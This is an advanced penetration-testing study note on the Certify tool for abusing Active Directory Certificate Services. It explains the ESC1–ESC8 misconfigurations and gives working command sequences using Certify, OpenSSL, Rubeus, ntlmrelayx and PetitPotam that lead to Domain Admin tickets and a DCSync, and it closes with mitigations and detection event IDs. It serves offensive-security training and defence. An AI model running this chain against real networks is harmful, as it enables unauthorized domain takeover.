---
tags: [tools, adcs, certificates, ad, vapt]
difficulty: advanced
module: "59 - Complete Tools Reference"
topic: "59.64 Certify AD CS Attack Tool"
---

# 64 - Certify AD CS Attack Tool

## 1. Executive Summary

Certify is a powerful C# enumeration and exploitation tool authored by Will Schroeder (harmj0y) and Lee Christensen (tifkin_) focused on Active Directory Certificate Services (AD CS). Following the groundbreaking "Certified Pre-Owned" whitepaper, AD CS abuse became a dominant vector for privilege escalation and persistence. Certify allows attackers to discover vulnerable Certificate Authorities (CAs), enumerate misconfigured Certificate Templates, request malicious certificates, and fundamentally break Active Directory's security boundaries.

## 2. Core Concepts & AD CS Architecture

Active Directory Certificate Services provides Public Key Infrastructure (PKI) to an AD environment. It issues certificates that can be used for digital signatures, encryption, and critically, **authentication** (via PKINIT).
- **Certificate Authority (CA)**: The server responsible for issuing certificates.
- **Certificate Templates**: Blueprints stored in AD that define who can request a certificate, what the certificate can be used for (Extended Key Usages - EKUs), and how the subject is built.
- **Subject Alternative Name (SAN)**: A field in the certificate that specifies additional identities. If a template allows the requester to supply the SAN, they can request a certificate *as someone else* (e.g., Domain Admin).

## 3. Architecture & Attack Flow Diagram

```text
[Attacker (Certify.exe)]             [AD CS / Enterprise CA]                [Domain Controller]
         |                                     |                                     |
         |=== ENUMERATION =====================|                                     |
         |--- 1. LDAP Query for Templates ---->|                                     |
         |                                     |<-- 2. Pulls Template Config --------|
         |<-- 3. Returns Vulnerable Template --|                                     |
         |                                     |                                     |
         |=== EXPLOITATION (ESC1) =============|                                     |
         |--- 4. Request Cert (SAN=DA) ------->|                                     |
         |                                     |                                     |
         |<-- 5. Issues DA Certificate --------|                                     |
         |                                     |                                     |
         |=== AUTHENTICATION (PKINIT) =========|                                     |
         |--- 6. AS-REQ (PKINIT Auth w/ Cert) -------------------------------------->|
         |<-- 7. AS-REP (TGT for Domain Admin) --------------------------------------|
         |                                     |                                     |
         |--- 8. DCSync Domain / Pwn AD -------------------------------------------->|
```

## 4. Deep Dive: Vulnerability Taxonomy (The "ESC"s)

Certify maps out various escalation vectors known as ESC1 through ESC11. Here are the most critical ones exploited by Certify:

### ESC1: Enrollee Supplies Subject
The holy grail of AD CS misconfigurations. The template allows Client Authentication, requires no manager approval, and crucially, has the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag set.
- **Impact**: Any authorized enrollee can request a certificate for **any** user in the domain (including Enterprise Admins).

### ESC2: Any Purpose
The template allows any purpose EKU (`2.5.29.37.0`) or no EKU, meaning the certificate can be used for Client Authentication, regardless of what the administrators intended.

### ESC3: Enrollment Agent
The template allows the "Certificate Request Agent" EKU. An attacker can request this certificate, and then use it to request *other* certificates on behalf of other users, escalating privileges.

### ESC4: Vulnerable Template Access Control
The attacker lacks enrollment rights on a template but possesses Write/Full Control over the template's AD object. They can modify the template to make it vulnerable to ESC1, exploit it, and revert it.

### ESC8: NTLM Relay to AD CS HTTP Endpoints
AD CS supports Web Enrollment endpoints (`http://ca-server/certsrv`). These endpoints often have NTLM authentication enabled without requiring SMB signing or HTTPS/Channel Binding. Attackers can relay NTLM authentications (e.g., from an induced machine account auth) to this endpoint to request a certificate as the victim.

## 5. Detailed Command Reference

### 5.1. Enumeration (`find`)
Certify automatically queries LDAP to find Enterprise CAs and analyzes all certificate templates for misconfigurations.
```bash
# Basic enumeration of all vulnerable templates
Certify.exe find /vulnerable

# Detailed enumeration including bloodhound output
Certify.exe find /vulnerable /bloodhound
```
*Output Analysis*: Look for `Enrollee Supplies Subject: True` and `Client Authentication` in the EKUs.

### 5.2. Certificate Request (`request`)
If an ESC1 template is identified, use the `request` module to exploit it.
```bash
# Exploiting ESC1 to become the Administrator
Certify.exe request /ca:CA.CORP.LOCAL\Corp-Issuing-CA /template:VulnTemplate /altname:Administrator
```
*Output*: Certify will generate a private key and output a PEM-formatted certificate.

### 5.3. Certificate Download (`download`)
If a certificate requires manager approval (but the manager approves it, or you compromise the manager), you can download the pending certificate via its ID.
```bash
Certify.exe download /ca:CA.CORP.LOCAL\Corp-Issuing-CA /id:12
```

## 6. Post-Exploitation: Converting and Using Certificates

Certify outputs certificates in PEM format. To use these with Windows tools (like Rubeus), they must be converted to PFX format.

### Step 1: PEM to PFX Conversion
Certify often outputs the private key (`cert.key`) and the certificate (`cert.pem`). Convert them using OpenSSL:
```bash
openssl pkcs12 -in cert.pem -inkey cert.key -macalg sha256 -export -out admin.pfx
```
Provide a password (e.g., `Password123`) when prompted.

### Step 2: Requesting a TGT with Rubeus
Take the `admin.pfx` file and use Rubeus to perform PKINIT authentication.
```bash
Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:Password123 /ptt
```
You now have a TGT for the Domain Admin injected into your session!

## 7. Advanced Scenarios: ESC8 NTLM Relaying

Certify does not perform the relaying, but it pairs with `ntlmrelayx` or `PetitPotam`.
1. Run `ntlmrelayx` pointing to the AD CS Web Enrollment HTTP endpoint.
   ```bash
   ntlmrelayx.py -t http://192.168.1.100/certsrv/certfnsh.asp -smb2support --adcs --template DomainControllers
   ```
2. Coerce authentication from a Domain Controller to your attacker machine using PetitPotam or PrinterBug.
3. `ntlmrelayx` intercepts the DC's auth, relays it to AD CS, and extracts a Base64 certificate for the Domain Controller.
4. Pass the Base64 cert into Rubeus to act as the DC.

## 8. Detection & Mitigation (Blue Team)

### Mitigations
1. **Disable `ENROLLEE_SUPPLIES_SUBJECT`**: Never allow enrollees to specify SANs on templates used for authentication.
2. **Require Manager Approval**: For high-risk templates, force enrollment to pend administrator approval.
3. **Disable Web Enrollment**: If not strictly required, remove the AD CS Web Enrollment feature.
4. **Enforce EPA**: If Web Enrollment is needed, enable Extended Protection for Authentication (EPA) and require HTTPS to prevent NTLM relaying (ESC8).
5. **Monitor Template Permissions**: Ensure standard users cannot modify Certificate Template objects in AD (ESC4).

### Detection
- Event ID `4886/4887`: Certificate Services received / approved a certificate request.
- Event ID `4768` (AS-REQ): Look for PKINIT authentications (Kerberos Authentication utilizing Certificates).
- Anomalous SAN Usage: Alert when a low-privileged user account requests a certificate where the Subject Alternative Name matches a high-privileged account (e.g., `Administrator`).

## 9. Chaining Opportunities

- **Rubeus**: As shown above, Certify's sole purpose is to produce material (Certificates) that [[63 - Rubeus Kerberos Attack Toolkit]] can consume to request TGTs and completely overtake the domain.
- **Mimikatz**: [[62 - Mimikatz All Modules]] can be used to export non-exportable certificates from disk using `crypto::certificates /export`, bypassing the need to use Certify to request new ones if existing ones are already valid.
- **ntlmrelayx**: For ESC8, chaining Coercion tools with [[60 - Impacket ntlmrelayx Deep Dive]] against AD CS endpoints is a lethal, unauthenticated-to-Domain-Admin vector.

## 10. Related Notes

- [[63 - Rubeus Kerberos Attack Toolkit]]
- [[62 - Mimikatz All Modules]]
- [[60 - Impacket ntlmrelayx Deep Dive]]
- [[34 - Active Directory Certificate Services Abuse]]
- [[40 - PetitPotam and Coercion Techniques]]
